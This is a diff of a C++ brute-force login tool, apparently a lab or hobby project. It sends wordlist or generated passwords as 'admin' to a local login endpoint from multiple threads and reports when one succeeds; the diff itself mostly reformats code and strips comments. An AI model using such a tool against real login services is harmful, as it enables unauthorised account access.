@@ -41,29 +41,29 @@ bool dynamicPasswordGen(int length, string password, int bot);
 
 class Bot
 {
-    public:
-        static bool passwordFound;
-        static int amountBots;
-        static const int maximumPasswordsInMemory = 1000000;
-        vector<string> wordlist;
-        
-        void brute()
+public:
+    static bool passwordFound;
+    static int amountBots;
+    static const int maximumPasswordsInMemory = 1000000;
+    vector<string> wordlist;
+
+    void brute()
+    {
+        for (string pass : wordlist)
         {
-            for (string pass : wordlist)
+
+            string response = sendAndReciveHTTP("admin", pass);
+            passwordTryProgress += 1;
+
+            if (response == "{\"success\":true,\"message\":\"Inloggad som admin\"}")
             {
-
-                string response = sendAndReciveHTTP("admin", pass);
-                passwordTryProgress += 1;
-
-                if (response == "{\"success\":true,\"message\":\"Inloggad som admin\"}")
-                {
-                    cout << "\nThe correct password is: " << pass << "\n";
-                    runTimer = false;
-                    passwordFound = true;
-                    break;
-                }
+                cout << "\nThe correct password is: " << pass << "\n";
+                runTimer = false;
+                passwordFound = true;
+                break;
             }
         }
+    }
 };
 
 bool Bot::passwordFound = false;
@@ -73,7 +73,7 @@ vector<thread> allBotThreads;
 
 int main()
 {
-  /* wordlistMenu();*/
+    /* wordlistMenu();*/
 
     mainMenu();
 
@@ -117,7 +117,7 @@ void mainMenu()
             cout << " Invalid input\n";
         }
     }
-    
+
 
 }
 
@@ -133,7 +133,6 @@ string sendAndReciveHTTP(string username, string password)
     CURLcode res;
     string response;
 
-    // JSON payload
     string json_payload = "{\"username\":\"" + username + "\", \"password\":\"" + password + "\"}";
 
     string output = "fail";
@@ -141,42 +140,33 @@ string sendAndReciveHTTP(string username, string password)
     curl = curl_easy_init();
     if (curl)
     {
-        // Sätt URL
         curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:3000/login");
 
-        // Sätt till POST
-        curl_easy_setopt(curl, CURLOPT_POST, 1L);  
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
 
-        // Sätt JSON payload
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload.c_str());
         curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, json_payload.length());
 
-        // Sätt headers (inklusive Content-Type)
         struct curl_slist* headers = NULL;
         headers = curl_slist_append(headers, "Content-Type: application/json");
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
-        // Sätt callback-funktion
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
 
-        // Utför förfrågan
         res = curl_easy_perform(curl);
 
-        // Kontrollera för fel
         if (res != CURLE_OK)
         {
-            
+
         }
         else
         {
             output = response;
         }
 
-        // Städa upp headers
         curl_slist_free_all(headers);
 
-        // Städa upp curl
         curl_easy_cleanup(curl);
     }
     return output;
@@ -338,7 +328,7 @@ void doBruteForceToMaxLength()
         }
     }
 
-  /*  exitThreads();*/
+    /*  exitThreads();*/
 
     runTimer = false;
 
@@ -347,7 +337,7 @@ void doBruteForceToMaxLength()
         cout << "Password not found" << endl;
         cout << "Press enter to continue" << endl;
     }
-    
+
     if (timerThread.joinable())
     {
         timerThread.join();
@@ -382,7 +372,7 @@ void allCombinationsMenu()
             validInput = true;
         }
     }
-    
+
     doBruteForceToMaxLength();
 }
 
@@ -395,18 +385,18 @@ void wordlistMenu()
     getline(cin, path);
 
 
-    ifstream in(path);        // öppna filen
+    ifstream in(path);
     if (!in)
-    {                    // kolla att den öppnades
+    {
         std::cerr << "Could not open the file: " << path << "\n";
         return;
     }
 
-    while (getline(in, passwordRow)) 
+    while (getline(in, passwordRow))
     {
         if (passwordRow.empty())
             continue;
-        
+
         string response = sendAndReciveHTTP("admin", passwordRow);
 
         if (response == "{\"success\":true,\"message\":\"Inloggad som admin\"}")
@@ -440,12 +430,5 @@ void bruterAsciiArt()
      |____/|_|  \_\\____/   |_|  |______|_|  \_\
 )" << '\n';
     cout << "\033[93m" "    - Made by BuzDee" << "\n\n\n";
-       
+
 }
-
-
-
-
-
-
-
